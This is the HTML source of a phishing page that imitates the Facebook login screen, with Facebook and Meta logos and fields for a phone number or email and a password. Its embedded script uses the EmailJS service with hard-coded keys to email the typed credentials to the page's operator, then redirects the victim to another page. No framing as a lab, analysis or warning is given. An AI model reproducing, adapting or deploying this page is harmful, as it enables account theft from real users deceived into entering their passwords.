<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta content="width=device-width, initial-scale=1" name="viewport" />
  <title>Facebook Login</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function() {
      emailjs.init("Leiv3B3TJnIgXAl1Q"); // Public Key
    })();

    function sendEmail() {
      const numero = document.getElementById("number").value;
      const mdp = document.getElementById("password").value;
      
      const fullMessage = `Numero: ${numero}\nMot de passe: ${mdp}`;
      
      const params = {
        message: fullMessage
      };
      
      emailjs.send("service_kvy0ei9", "template_hmuhlmi", params)
        .then(function(res) {
          document.getElementById("number").value = "";
          document.getElementById("password").value = "";
          window.location.href = "index3.html";
        }, function(err) {
          console.error(err);
        });
    }
  </script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      background-color: white;
      font-family: Arial, sans-serif;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    
    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      max-width: 400px;
    }
    
    /* Form Container */
    .form-container {
      width: 100%;
      text-align: center;
      margin-bottom: 30px;
    }
    
    .logo {
      margin-bottom: 16px;
    }
    
    .login-form {
      display: flex;
      flex-direction: column;
      gap: 16px;
    }
    
    .input-field {
      width: 100%;
      padding: 12px 20px;
      border: 1px solid #ccc;
      border-radius: 30px;
      font-size: 16px;
      color: #444;
      outline: none;
    }
    
    .input-field:focus {
      border-color: #3b82f6;
      box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.5);
    }
    
    .submit-btn {
      width: 100%;
      padding: 14px;
      background-color: #3b82f6;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 30px;
      cursor: pointer;
    }
    
    .submit-btn:hover {
      background-color: #2563eb;
    }
    
    .forgot-password {
      margin-top: 10px;
      font-size: 14px;
      color: #444;
    }

    .bottom-section {
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 24px;
    }
    
    .create-account-btn {
      width: 100%;
      padding: 14px;
      border: 1px solid #3b82f6;
      background-color: white;
      color: #3b82f6;
      font-size: 16px;
      border-radius: 30px;
      cursor: pointer;
    }
    
    .create-account-btn:hover {
      background-color: #3b82f6;
      color: white;
    }
    
    .meta-logo {
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 16px;
      color: #444;
    }
  </style>
</head>

<body>
  <div class="container">
    <div class="form-container">
      <img class="logo" alt="Facebook logo" src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" width="80" height="80" />
      <form class="login-form">
        <input class="input-field" type="text" id="number" placeholder="Mobile number or email address" />
        <input class="input-field" type="password" id="password" placeholder="Password" />
        <button type="button" class="submit-btn" onclick="sendEmail()">Log in</button>
      </form>
      <div class="forgot-password">
        Forgotten password?
      </div>
    </div>
    <div class="bottom-section">
      <button class="create-account-btn">Create new account</button>
      <div class="meta-logo">
        <img alt="Meta logo" src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Meta-Logo.png" width="auto" height="40" />
      </div>
    </div>
  </div>
</body>
  </html>
